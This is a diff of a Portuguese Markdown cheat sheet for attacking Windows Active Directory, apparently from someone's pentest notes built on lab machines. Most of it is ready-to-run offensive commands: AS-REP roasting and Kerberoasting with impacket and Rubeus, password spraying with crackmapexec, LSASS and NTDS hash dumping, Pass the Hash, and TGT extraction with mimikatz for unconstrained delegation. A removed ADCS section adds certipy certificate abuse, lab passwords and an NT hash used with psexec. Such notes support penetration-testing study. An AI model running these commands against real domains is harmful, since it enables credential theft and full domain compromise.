@@ -3,22 +3,22 @@ Active Directory
 
 Aqui já podemos levar em conta que já temos uma credencial válida de domínio e, até podemos ter acesso a máquina, mas se não houver, podemos começar conforme os passos abaixo:
 
-- [ ] [**Enumeração do domínio com bloodhound**](#enumeracao%20do%20dominio%20com%20bloodhound)
-- [ ] [**Enumeração manual do domínio**](#enumeracao%20manual)
-    - [ ] [Enumerar usuários privilegiados](#enumerar%20usuarios%20privilegiados)
-- [ ] [**AsRep Roasting**](#asrep%20roasting) impacket ou Rubeus
-- [ ] [**Password Spray**](#password%20spray)
+- [ ] [**Enumeração do domínio com bloodhound**](#enumeracao-do-dominio-com-bloodhound)
+- [ ] [**Enumeração manual do domínio**](#enumeracao-manual)
+    - [ ] [Enumerar usuários privilegiados](#enumerar-usuarios-privilegiados)
+- [ ] [**AsRep Roasting**](#asrep-roasting) impacket ou Rubeus
+- [ ] [**Password Spray**](#password-spray)
 - [ ] [**Enumerar contas de serviço**](#enumerar-contas-de-servico)
 - [ ] [**Kerberoasting**](#kerberoasting): impacket ou Rubeus
-- [ ] [**Dump de hashes**](#lsass%20dump)
+- [ ] [**Dump de hashes**](#lsass-dump)
 - [ ] [**Pass the Hash**](#pass-the-hash)
 - [ ] [**Over Pass the Hash**](#over-pass-the-hash)
 - [ ] [**Silver Ticket**](#silver-ticket)
 - [ ] [**Adicionar usuário privilegiado**](#adicionar-usuario-privilegiado)
 - [ ] [**Permissionamento de usuário**](#permissionamento-de-usuario)
-- [ ] [**ADCS**](#adcs)
+- [ ] [**Unconstrained delegation**](#unconstrained%20delegation)
 
-## Enumeracao do dominio com Bloodhound
+## Enumeração do domínio com Bloodhound
 
 Opção remota com bloodhound-python
 
@@ -41,12 +41,10 @@ Cuidado com esses comandos em ambiente corporativo. Faz muito barulho!!!
 
 <details markdown="1"><summary markdown="1">
 
-Como essa sessão não é tão utilizada, optei por minimizar esse conteúdo
+Com essa sessão não é tão utilizada, optei por minimizar esse conteúdo
 
 ## Enumeracao Manual
 </summary>
-
-
 
 **oneliner(users)**
 
@@ -85,7 +83,7 @@ $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain
  
 ```
 
-### Enumerar usuarios privilegiados
+### Enumerar usuários privilegiados
 
 ```
     $ldapFilter = "(&(objectclass=user)(memberof=CN=Domain Admins,CN=Users,DC=xor,DC=com))"
@@ -111,20 +109,16 @@ onde DC (no filtro, primeira linha do script) ali vai ser o nome do domínio que
 
 Com impacket
 
-```
-impacket-GetNPUsers -usersfile usernames.txt -dc-host <hostname_dc> <dominio>
-```
+    impacket-GetNPUsers -usersfile usernames.txt -dc-host <hostname_dc> <dominio>
 
 ou com Rubeus
-```
-./r.exe asreproast /domain:<dominio> /dc:<hostname_dc>
-```
+
+    ./r.exe asreproast /domain:<dominio> /dc:<hostname_dc>
 
 Depois, para quebrar o(s) hash(s):
 
-```
-john --format=krb5asrep -w /usr/share/wordlists/rockyou.txt hashes_temp.txt
-```
+    john --format=krb5asrep -w /usr/share/wordlists/rockyou.txt hashes_temp.txt
+
 ### Referência em vídeo
 
 ![type:video](https://youtube.com/embed/xNGfCADe9tk)
@@ -141,24 +135,22 @@ john --format=krb5asrep -w /usr/share/wordlists/rockyou.txt hashes_temp.txt
 14:25 Explorando com Impacket no Linux
 
 
+
 ## Password spray
 
 ```
-netexet ldap hosts.txt -u users.txt -p P@ssword! --continue
+crackmapexec ldap hosts.txt -u users.txt -p P@ssword! --continue
+
+crackmapexec smb 10.10.11.152 -u users.txt -p passwords_test.txt --continue
+
+crackmapexec winrm 10.10.11.152 -u users.txt -p passwords_test.txt --continue
 ```
 
-```
-netexec smb 10.10.11.152 -u users.txt -p passwords_test.txt --continue
-```
-
-```
-netexec winrm 10.10.11.152 -u users.txt -p passwords_test.txt --continue
-```
 
 ## Enumerar contas de serviço
 
 ```
-setspn -F -Q */*
+    setspn -F -Q */*
 ```
 
 ```
@@ -281,20 +273,12 @@ procdump
 
 TaskManager
 
-![](../../../media/Pasted%20image%2020240531230707.png)
+![qownnotes-media-jjlIpZ](../../media/qownnotes-media-jjlIpZ.png)
 
-![../media](Pasted%20image%2020240531230254.png)
+Crackmapexec
 
-![[Pasted image 20240531230040.png]]
+    crackmapexec smb 192.168.175.202 -u Administrator -H "<nt_hash>" --lsa
 
-
-![qownnotes-media-jjlIpZ](../../../media/qownnotes-media-jjlIpZ.png)
-
-netexec
-
-```
-netexec smb 192.168.175.202 -u Administrator -H "<nt_hash>" --lsa
-```
 ## Pass the hash
 
 
@@ -477,16 +461,41 @@ Assim que os arquivos necessários estiverem an máquina do atacante, considere 
 
     impacket-secretsdump local -ntds ntds.dit -system system
 
+## Unconstrained delegation
 
-## ADCS
+A premissa é achar uma máquina que possui "unconstrained delegation" ou unrestricted kerberos delegation" configurado, pois nela será salvo os TGTs de usuários que podemos utilizá-los para nos autenticar em outras máquinas:
+
+Enumerando
+```
+Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
+```
+
+_Remotamente_
+
+```
+ldapsearch -LLL -x -H ldap://dc.support.htb -D "support@support.htb" -W -b "dc=support,dc=htb" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
+```
+
+```
+ldapsearch -LLL -x -H ldap://pdc01.lab.ropnop.com -D "thoffman@lab.ropnop.com" -W -b "dc=lab,dc=ropnop,dc=com" "(&(objectCategory=computer)(objectClass=computer) userAccountControl:1.2.840.113556.1.4.80 3:=524288))"
+```
 
 
-    netexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M adcs
-    
-    certipy find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -stdout -vulnerable
-    
-    certipy req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -ca sequel-DC-CA -template UserAuthentication -upn 'Administrator@sequel.htb'
-    
-    certipy auth -pfx administrator.pfx
-    
-    impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee Administrator@sequel.htb
+Com powerview podemos utilizar o seguinte comando:
+
+```
+Get-DomainComputer -Unconstrained
+```
+
+Para enumerar os TGTs presentes na máquina, precisamos executar o mimikatz com os seguintes comandos:
+
+```
+mimikatz.exe
+debug::privileges
+sekurlsa::tickets
+```
+
+## Constrained delegation
+
+
+(userAccountControl:1.2.840.113556.1.4.803:=524288)’
